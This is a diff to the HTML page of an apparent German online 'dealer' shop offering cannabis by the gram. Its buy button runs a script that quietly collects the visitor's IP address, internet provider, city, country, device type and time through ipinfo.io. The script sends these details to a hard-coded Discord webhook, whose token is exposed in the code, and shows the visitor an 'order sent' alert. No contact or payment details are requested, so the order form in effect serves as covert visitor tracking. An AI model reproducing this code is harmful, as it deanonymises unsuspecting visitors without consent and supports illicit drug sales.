@@ -19,6 +19,17 @@
             font-size: 24px;
             font-weight: bold;
         }
+        nav {
+            background-color: #1a1a1a;
+            padding: 10px;
+            text-align: center;
+        }
+        nav a {
+            color: #d1a3ff;
+            margin: 0 15px;
+            text-decoration: none;
+            font-size: 18px;
+        }
         .container {
             width: 80%;
             margin: auto;
@@ -31,6 +42,11 @@
             margin: 20px;
             border-radius: 10px;
         }
+        .product img {
+            width: 100%;
+            max-width: 300px;
+            border-radius: 10px;
+        }
         .buy-button {
             background-color: #6a0dad;
             color: white;
@@ -39,6 +55,13 @@
             border-radius: 5px;
             cursor: pointer;
             margin-top: 10px;
+        }
+        footer {
+            background-color: #1a1a1a;
+            color: #d1a3ff;
+            text-align: center;
+            padding: 10px;
+            margin-top: 40px;
         }
     </style>
     <script>
@@ -50,42 +73,39 @@
             fetch('https://ipinfo.io/json')
                 .then(response => response.json())
                 .then(data => {
-                    const ip = data.ip;
-                    const isp = data.org || 'Unbekannt';
-                    const location = data.city + ', ' + data.region + ', ' + data.country;
-                    const device = getDeviceType();
-                    const datetime = new Date().toLocaleString();
-                    
-                    const webhookURL = "https://discord.com/api/webhooks/1350910682815791114/BIMv2BK2N-rv5M3F3FR_15hbSQelBVZU-khzJsrSkZCzXTcmzoZtae_EZgy_KWYdELhA";
-                    
-                    const order = {
-                        content: `Neue Bestellung: ${productName} - Preis: ${price}€\nIP-Adresse: ${ip}\nGerät: ${device}\nInternet-Anbieter: ${isp}\nStandort: ${location}\nDatum/Uhrzeit: ${datetime}`
+                    const orderData = {
+                        content: `\n📦 **Neue Bestellung!**\n\n✅ **Produkt:** ${productName}\n💰 **Preis:** ${price}€\n📍 **IP-Adresse:** ${data.ip}\n🖥 **Gerät:** ${getDeviceType()}\n🌐 **Internet-Anbieter:** ${data.org || 'Unbekannt'}\n📌 **Standort:** ${data.city}, ${data.region}, ${data.country}\n⏰ **Datum/Uhrzeit:** ${new Date().toLocaleString()}\n\n` 
                     };
                     
-                    fetch(webhookURL, {
+                    fetch("https://discord.com/api/webhooks/1350910682815791114/BIMv2BK2N-rv5M3F3FR_15hbSQelBVZU-khzJsrSkZCzXTcmzoZtae_EZgy_KWYdELhA", {
                         method: "POST",
                         headers: { "Content-Type": "application/json" },
-                        body: JSON.stringify(order)
-                    }).then(response => {
-                        alert("Bestellung erfolgreich gesendet!");
-                    }).catch(error => {
-                        alert("Fehler beim Senden der Bestellung.");
-                    });
+                        body: JSON.stringify(orderData)
+                    }).then(() => alert("✅ Bestellung erfolgreich gesendet!"))
+                      .catch(() => alert("❌ Fehler beim Senden der Bestellung."));
                 })
-                .catch(error => {
-                    alert("Fehler beim Abrufen der IP-Informationen.");
-                });
+                .catch(() => alert("❌ Fehler beim Abrufen der IP-Informationen."));
         }
     </script>
 </head>
 <body>
     <header>Unsere Produkte</header>
+    <nav>
+        <a href="index.html">Über Uns</a>
+        <a href="produkte.html">Produkte</a>
+        <a href="kontakt.html">Kontakt</a>
+    </nav>
     <div class="container">
         <div class="product">
             <h2>Amnesia Haze</h2>
+            <img src="https://flower-power.io/cdn/shop/files/amnesia-haze-13-percent-cannabinoide-5percent-d9thcp-flower-power-2.jpg?v=1738344340&width=1800" alt="Amnesia Haze">
+            <p>Ein klassischer Sativa-Strain mit intensivem Aroma.</p>
             <p><strong>Preis: 14€/g</strong></p>
             <button class="buy-button" onclick="orderProduct('Amnesia Haze', 14)">Kaufen</button>
         </div>
     </div>
+    <footer>
+        &copy; 2025 Semih's Dealer - Alle Rechte vorbehalten.
+    </footer>
 </body>
 </html>
